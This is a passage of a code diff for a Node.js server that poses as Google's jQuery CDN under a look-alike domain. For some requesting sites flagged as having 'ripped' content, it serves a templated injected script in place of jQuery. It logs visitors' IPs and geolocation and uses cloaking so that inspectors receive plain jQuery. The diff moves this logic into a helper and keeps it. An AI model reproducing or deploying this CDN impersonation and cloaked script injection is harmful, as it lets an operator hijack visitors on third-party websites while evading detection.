-            sendPlainFont(font, res);
-          }
-        } else {
-          // console.log("Failed to get a response from process_request");
-          sendPlainFont(font, res);
-        }
-      });
-    }
-  } else {
-    sendPlainFont(font, res);
-  }
 });
 
 //ajax.googleapis.io GENERAL ENDPOINT
 app.get('/ajax/libs/jquery/:jqueryVersion/jquery.min.js', function(req, res) {
 
   var url = req.headers.referrer || req.headers.referer;
-  var full_url = url;
-
   var jqueryVersion = req.params.jqueryVersion;
-
   var uuid = config.uuidJqueryArr[jqueryVersion];
 
   if (!uuid) {
+    console.log("no uuid /ajax redirecting to ajax.googleapis.com..");
     res.redirect('http://ajax.googleapis.com' + req.url);
     return;
   }
 
-  var ip = getClientAddress(req);
-  var geo = geoip.lookup(ip);
+  var options = {
+    url: url,
+    uuid: uuid
+  };
 
-  if (!geo) {
-    geo = { country: "UNKNOWN" };
-    console.log("/ajax/libs/jquery/ IP: " + ip + " had unknown geo region.");
-  }
+  processRequest(req, res, options);
 
-  if (!ip) {
-    ip = "0.0.0.0";
-  }
-
-  //if add success then we can jack else serve plain css
-  if (addClientToWhitelistWindow(ip)) {
-
-    // console.log("\nurl : " + url + "\nuuid: " + uuid + " " + "\nip: " + ip + "\ngeo: " + geo);
-
-    if (!url) {
-      console.log("Error: undefined url.");
-      // console.log(req.headers);
-      sendPlainJquery(req, res);
-    } else {
-
-      url = formatURL(url);
-      var domain = getDomain(url);
-
-      connection.query("select process_request(?,?,?,?,?,?) AS value;", [url, uuid, domain, full_url, geo.country, ip], function(err, docs) {
-        if (docs != undefined && docs[0] != undefined) {
-          var response_string = docs[0].value;
-          var cloaked = 0;
-
-          // console.log("not plain jquery " + response_string + " uuid: " + uuid);
-
-          //console.log("Response from process_request: " + response_string);
-          if (response_string == "OLD_RIPPED") {
-            //send back data!
-            getClientResponseJSON(uuid, url, ip, function(response) {
-
-              //console.log("Response to client: " + response.jquery);
-
-              if (response.jquery == false) {
-                sendPlainJquery(req, res);
-                return;
-              } else if (response.jquery == "cloaked") {
-                cloaked = 1;
-                sendPlainJquery(req, res);
-                return;
-              } else {
-                response = response.jquery;
-              }
-
-              fs.readFile('./client/compressed/compressed_landercode_experimental2.js', function(err, data) {
-                if (err) throw err;
-                var replacedFile = String(data).replace('replacemeuuid', uuid);
-                replacedFile = String(replacedFile).replace('replacemelinks', response);
-                replacedFile = String(replacedFile).replace('jqueryVersion', jqueryVersion);
-                if (cloaked == 1) {
-                  replacedFile = String(replacedFile).replace('replacemestats', 'yes');
-                }
-
-                res.writeHead(200, {
-                  'Content-Length': replacedFile.length,
-                  'Content-Type': 'text/plain',
-                  'Access-Control-Allow-Origin': '*',
-                  'Access-Control-Allow-Methods': 'GET, OPTIONS',
-                  'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept'
-                });
-                res.end(replacedFile);
-              });
-            });
-          } else if (response_string == "OLD_REGISTERED" || response_string == "NEW_REGISTERED") {
-            sendBlankResponse(res);
-          } else if (response_string == "UNKNOWN_BEHAVIOR") {
-            // console.log("Something went wrong when calling process_request.");
-            sendPlainJquery(req, res);
-          } else if (response_string == "UNKNOWN_UUID") {
-            // console.log("An unknown uuid (" + uuid + ") was sent to the DB.");
-            sendPlainJquery(req, res);
-          } else {
-            sendPlainJquery(req, res);
-          }
-        } else {
-          // console.log("Failed to get a response from process_request");
-          sendPlainJquery(req, res);
-        }
-      });
-    }
-  } else {
-    sendPlainJquery(req, res);
-  }
 });
 
 
